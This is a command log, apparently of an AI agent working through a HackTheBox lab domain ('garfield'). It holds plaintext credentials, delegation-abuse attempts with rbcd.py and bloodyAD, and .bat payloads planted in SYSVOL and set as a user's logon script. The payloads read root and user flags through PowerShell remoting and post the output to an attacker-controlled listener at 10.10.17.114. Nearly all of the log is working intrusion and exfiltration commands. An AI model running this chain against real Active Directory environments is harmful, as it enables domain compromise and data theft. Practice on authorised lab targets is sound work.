@@ -1,0 +1,156 @@
+[11:51:25] READ: /htb/machines/garfield/state/creds.jsonl
+[11:51:25] RUN: ls /htb/machines/garfield/state/ 2>/dev/null
+[11:51:28] RUN: cat /htb/machines/garfield/state/surface.jsonl | grep -i "dc01\|garfield\|domain" | head -5
+[11:51:36] RUN: which rbcd.py 2>/dev/null; which bloodyAD 2>/dev/null; pip show bloodyAD 2>/dev/null | head -3; which impacket-rbcd 2>/dev/null; find / -name "rbcd*" -type f 2>/dev/null | head -5
+[11:51:37] RUN: crackmapexec winrm 10.129.17.223 -u 'l.wilson_adm' -p 'P@ssw0rd2026!' -d garfield.htb 2>&1 | tail -5
+[11:51:51] RUN: python3 /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'RODC01$' -delegate-to 'DC01$' -dc-ip 10.129.17.223 -action write 'garfield.htb/l.wilson_adm:P@ssw0rd2026!' 2>&1
+[11:52:02] RUN: python3 /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'RODC01$' -delegate-to 'DC01$' -dc-ip 10.129.17.223 -action write 'garfield.htb/RODC01$:N3wR0dcP@ss!' 2>&1
+[11:52:06] RUN: python3 /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'RODC01$' -delegate-to 'DC01$' -dc-ip 10.129.17.223 -action write 'garfield.htb/RODC01$:NewRodcPass123!' 2>&1
+[11:52:45] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | grep -E 'RODC01|l.wilson_adm' | tail -5
+[11:52:45] RUN: which bloodyAD 2>/dev/null; bloodyAD --help 2>&1 | head -5
+[11:52:49] RUN: pip install bloodyAD 2>&1 | tail -3; which bloodyAD 2>/dev/null || pip show bloodyAD 2>/dev/null | grep Location
+[11:52:51] RUN: which rbcd.py 2>/dev/null; find / -name "rbcd.py" -type f 2>/dev/null | head -3; which impacket-rbcd 2>/dev/null; impacket-getST 2>&1 | head -3
+[11:52:56] RUN: pip install bloodyAD --break-system-packages 2>&1 | tail -5
+[11:52:57] RUN: which getST.py 2>/dev/null; find / -name "getST.py" -type f 2>/dev/null | head -3
+[11:53:03] RUN: bloodyAD --host 10.129.17.223 -d garfield.htb -u 'RODC01$' -p 'N3wR0dcP@ss!' add rbcd 'DC01$' 'RODC01$' 2>&1
+[11:53:06] RUN: python3 -m bloodyAD --host 10.129.17.223 -d garfield.htb -u 'RODC01$' -p 'N3wR0dcP@ss!' add rbcd 'DC01$' 'RODC01$' 2>&1
+[11:53:10] RUN: find /home/hacker/.local/bin -name "bloody*" 2>/dev/null; pip show bloodyAD 2>/dev/null | grep -E "Location|Name"
+[11:53:13] RUN: /home/hacker/.local/bin/bloodyAD --host 10.129.17.223 -d garfield.htb -u 'RODC01$' -p 'N3wR0dcP@ss!' add rbcd 'DC01$' 'RODC01$' 2>&1
+[11:53:19] RUN: /home/hacker/.local/bin/bloodyAD --host 10.129.17.223 -d garfield.htb -u 'RODC01$' -p 'NewRodcPass123!' add rbcd 'DC01$' 'RODC01$' 2>&1
+[11:53:20] RUN: crackmapexec ldap 10.129.17.223 -u 'RODC01$' -p 'N3wR0dcP@ss!' -d garfield.htb 2>&1; crackmapexec ldap 10.129.17.223 -u 'RODC01$' -p 'NewRodcPass123!' -d garfield.htb 2>&1
+[11:54:18] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
+[11:54:18] RUN: cat /htb/machines/garfield/state/surface.jsonl 2>/dev/null | tail -10
+[11:54:39] RUN: nslookup RODC01.garfield.htb 10.129.17.223 2>&1 | head -10
+[11:54:40] RUN: crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb 2>&1
+[11:54:59] RUN: crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x '$pass = ConvertTo-SecureString "P@ssw0rd2026!" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("garfield\l.wilson_adm",$pass); Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -ScriptBlock {whoami; hostname}' 2>&1
+[11:55:11] RUN: crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'try { $pass = ConvertTo-SecureString "P@ssw0rd2026!" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("garfield\l.wilson_adm",$pass); $r = Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -ScriptBlock {whoami; hostname} -ErrorAction Stop; Write-Output "RESULT: $r" } catch { Write-Output "ERROR: $_" }' 2>&1
+[11:55:28] RUN: crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'try { Set-Item WSMan:\localhost\Client\TrustedHosts -Value "RODC01.garfield.htb" -Force; $pass = ConvertTo-SecureString "P@ssw0rd2026!" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("garfield\l.wilson_adm",$pass); $r = Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -Authentication Negotiate -ScriptBlock {whoami; hostname} -ErrorAction Stop; Write-Output "RESULT: $r" } catch { Write-Output "ERROR: $_" }' 2>&1
+[11:55:42] RUN: crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'try { $pass = ConvertTo-SecureString "P@ssw0rd2026!" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("garfield\l.wilson_adm",$pass); $r = Invoke-Command -ComputerName 192.168.100.2 -Credential $cred -Authentication Negotiate -ScriptBlock {whoami; hostname} -ErrorAction Stop; Write-Output "RESULT: $r" } catch { Write-Output "ERROR: $_" }' 2>&1
+[11:56:07] RUN: cat > /tmp/payload.bat << 'BATEOF'
+@echo off
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$pass = ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('garfield\l.wilson_adm',$pass); try { $r = Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -ScriptBlock {whoami; hostname; Get-ChildItem C:\Users\Administrator\Desktop\ -ErrorAction SilentlyContinue | ForEach-Object {$_.Name}; type C:\Users\Administrator\Desktop\root.txt 2>&1} -ErrorAction Stop; $r | Out-File C:\Users\l.wilson\Desktop\rodc_out.txt -Force } catch { $_ | Out-File C:\Users\l.wilson\Desktop\rodc_err.txt -Force }"
+BATEOF
+echo "Bat file created"
+[11:56:11] RUN: smbclient '//10.129.17.223/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put /tmp/payload.bat payload.bat' 2>&1
+[11:56:16] RUN: bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.17.223 set object l.wilson scriptPath '\\DC01\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[11:56:20] RUN: which bloodyAD bloody-ad python3 -m bloodyAD 2>&1; pip show bloodyAD 2>&1 | head -5; find / -name "bloodyAD*" -o -name "bloody*" 2>/dev/null | head -5
+[11:56:25] RUN: /home/hacker/.local/bin/bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.17.223 set object l.wilson scriptPath '\\DC01\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[11:56:29] RUN: /home/hacker/.local/bin/bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -H 10.129.17.223 set object l.wilson scriptPath -v '\\DC01\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[11:56:36] RUN: sleep 15 && crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'type C:\Users\l.wilson\Desktop\rodc_out.txt 2>&1; echo "---"; type C:\Users\l.wilson\Desktop\rodc_err.txt 2>&1' 2>&1
+[11:57:03] RUN: /home/hacker/.local/bin/bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -H 10.129.17.223 set object l.wilson scriptPath -v '' 2>&1 && sleep 3 && /home/hacker/.local/bin/bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -H 10.129.17.223 set object l.wilson scriptPath -v '\\DC01\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[11:57:27] RUN: ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[\d.]+'
+[11:57:28] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -10
+[11:57:28] RUN: ls /htb/machines/garfield/exploits/ 2>/dev/null
+[11:57:32] RUN: mkdir -p /tmp/smbshare && chmod 777 /tmp/smbshare
+[11:57:33] RUN: # First verify connectivity to new target IP
+crackmapexec smb 10.129.17.223 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb 2>&1 | head -5
+[11:57:38] RUN: # Check if l.wilson_adm creds still work
+crackmapexec ldap 10.129.17.223 -u 'l.wilson_adm' -p 'P@ssw0rd2026!' -d garfield.htb 2>&1 | head -5
+[11:57:41] RUN: crackmapexec smb 10.129.17.223 -u 'l.wilson_adm' -p 'P@ssw0rd2026!' -d garfield.htb 2>&1 | head -5
+[11:57:48] RUN: # Start impacket SMB server to receive output
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /tmp/smbshare &>/tmp/smbserver.log &
+echo "SMB server PID: $!"
+[11:57:57] RUN: # Create the bat payload - PowerShell commands via bat
+cat > /tmp/payload.bat << 'BATEOF'
+@echo off
+powershell -ep bypass -c "$cred = New-Object System.Management.Automation.PSCredential('garfield.htb\l.wilson_adm',(ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force)); $r = Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -ScriptBlock {whoami; ipconfig; type C:\Users\Administrator\Desktop\root.txt 2>&1; dir C:\Users\*\Desktop\*.txt 2>&1} -ErrorAction Stop; $r | Out-File \\10.10.17.114\share\rodc_out.txt"
+BATEOF
+cat /tmp/payload.bat
+[11:59:27] RUN: ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+[11:59:28] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
+[11:59:34] RUN: cat > /tmp/chain.bat << 'BATEOF'
+@echo off
+powershell -ep bypass -c "$cred=New-Object System.Management.Automation.PSCredential('garfield\l.wilson_adm',(ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force)); $res=try{Invoke-Command -ComputerName 192.168.100.2 -Credential $cred -ScriptBlock {hostname;whoami;Get-Content C:\Users\Administrator\Desktop\root.txt 2>$null;Get-Content C:\Users\*\Desktop\user.txt 2>$null} 2>&1 | Out-String}catch{$_.Exception.Message}; Invoke-WebRequest -Uri 'http://10.10.17.114:8080/result' -Method POST -Body $res -ErrorAction SilentlyContinue; Invoke-WebRequest -Uri ('http://10.10.17.114:8080/b64/' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res))) -ErrorAction SilentlyContinue"
+BATEOF
+cat /tmp/chain.bat
+[11:59:38] RUN: smbclient '//10.129.17.223/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put /tmp/chain.bat chain.bat; ls' 2>&1
+[11:59:47] RUN: python3 -c "
+import http.server, sys, signal, time
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length).decode('utf-8', errors='replace')
+        print(f'[POST] {self.path}')
+        print(f'[BODY] {body}')
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
+        with open('/tmp/callback_received.txt','w') as f:
+            f.write(f'{self.path}\n{body}')
+    def do_GET(self):
+        print(f'[GET] {self.path}')
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
+        with open('/tmp/callback_received.txt','w') as f:
+            f.write(f'GET {self.path}')
+    def log_message(self, format, *args): pass
+
+srv = http.server.HTTPServer(('0.0.0.0', 8080), Handler)
+srv.timeout = 120
+print('Listening on 0.0.0.0:8080...')
+sys.stdout.flush()
+start = time.time()
+while time.time() - start < 120:
+    srv.handle_request()
+    import os
+    if os.path.exists('/tmp/callback_received.txt'):
+        print('Callback received, exiting')
+        break
+print('Listener done')
+" 2>&1
+[11:59:49] RUN: rm -f /tmp/callback_received.txt; bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.17.223 set object l.wilson scriptPath '\\DC01\SYSVOL\garfield.htb\scripts\chain.bat' 2>&1
+[11:59:52] RUN: which bloodyAD bloody-ad python3 -m bloodyAD 2>/dev/null; pip show bloodyAD 2>/dev/null | head -5; find / -name 'bloodyAD*' -o -name 'bloody*' 2>/dev/null | head -5
+[11:59:57] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --host 10.129.17.223 set object l.wilson scriptPath '\\DC01\SYSVOL\garfield.htb\scripts\chain.bat' 2>&1
+[12:00:03] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -H 10.129.17.223 set object l.wilson scriptPath -v '\\DC01\SYSVOL\garfield.htb\scripts\chain.bat' 2>&1
+[12:00:08] RUN: for i in $(seq 1 24); do if [ -f /tmp/callback_received.txt ]; then echo "CALLBACK RECEIVED:"; cat /tmp/callback_received.txt; exit 0; fi; sleep 5; done; echo "NO CALLBACK after 120s"
+[12:02:33] READ: /htb/machines/garfield/state/creds.jsonl
+[12:02:34] RUN: cat /etc/hosts | grep garfield
+[12:02:36] RUN: ip -4 addr show tun0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1
+[12:02:51] RUN: cat > /tmp/payload.bat << 'BATEOF'
+@echo off
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$result = ''; try { $secpw = ConvertTo-SecureString 'P@ssw0rd2026!' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('garfield\l.wilson_adm', $secpw); $out = Invoke-Command -ComputerName RODC01.garfield.htb -Credential $cred -ScriptBlock { whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\root.txt 2>&1; type C:\Users\Administrator\Desktop\user.txt 2>&1 } -ErrorAction Stop; $result = $out -join '`n' } catch { $result = 'ERROR: ' + $_.Exception.Message }; try { Invoke-WebRequest -Uri 'http://10.10.17.114:8080/result' -Method POST -Body $result -UseBasicParsing } catch {}"
+BATEOF
+echo "Bat file written"
+[12:02:55] RUN: smbclient '//10.129.17.223/SYSVOL' -U 'garfield.htb/j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts; put /tmp/payload.bat payload.bat' 2>&1
+[12:02:59] RUN: python3 -c "
+import http.server, socketserver, sys, threading, time
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(length).decode('utf-8', errors='replace')
+        with open('/tmp/callback_result.txt', 'w') as f:
+            f.write(body)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
+        print(f'CALLBACK RECEIVED: {body[:500]}', flush=True)
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
+        print('GET callback received', flush=True)
+    def log_message(self, format, *args):
+        print(f'HTTP: {format % args}', flush=True)
+
+httpd = socketserver.TCPServer(('0.0.0.0', 8080), Handler)
+httpd.timeout = 120
+print('Listening on :8080', flush=True)
+httpd.handle_request()
+httpd.handle_request()
+httpd.handle_request()
+print('Done listening', flush=True)
+" 2>&1
+[12:03:04] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.223 set object 'l.wilson' 'scriptPath' -v '\\DC01.garfield.htb\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[12:03:08] RUN: which bloodyad 2>/dev/null; pip show bloodyAD 2>/dev/null | head -5; find / -name "bloodyAD*" -o -name "bloodyad*" 2>/dev/null | head -5
+[12:03:14] RUN: /home/hacker/.local/bin/bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.223 set object 'l.wilson' 'scriptPath' -v '\\DC01.garfield.htb\SYSVOL\garfield.htb\scripts\payload.bat' 2>&1
+[12:03:20] RUN: # Check if we have l.wilson's password in creds
+grep -i "l.wilson" /htb/machines/garfield/state/creds.jsonl 2>/dev/null | grep -v "l.wilson_adm"
+[12:03:25] RUN: # We don't have l.wilson's password directly. But on HTB machines, there's often a simulated logon.
+# Let's wait ~60 seconds for a scheduled logon simulation, then check for callback
+sleep 60 && cat /tmp/callback_result.txt 2>/dev/null && echo "---CALLBACK FILE EXISTS---" || echo "---NO CALLBACK YET---"
+[12:04:28] RUN: # Wait another 60 seconds - HTB simulated logons can take 1-2 minutes
+sleep 60 && cat /tmp/callback_result.txt 2>/dev/null && echo "---CALLBACK FILE EXISTS---" || echo "---NO CALLBACK YET---"
+[12:04:29] RUN: cat /tmp/claude-1000/-htb-machines-garfield/ab6a5e5c-d71f-4528-ba1c-16fd9e97e7f0/tasks/bnhprbzri.output 2>/dev/null
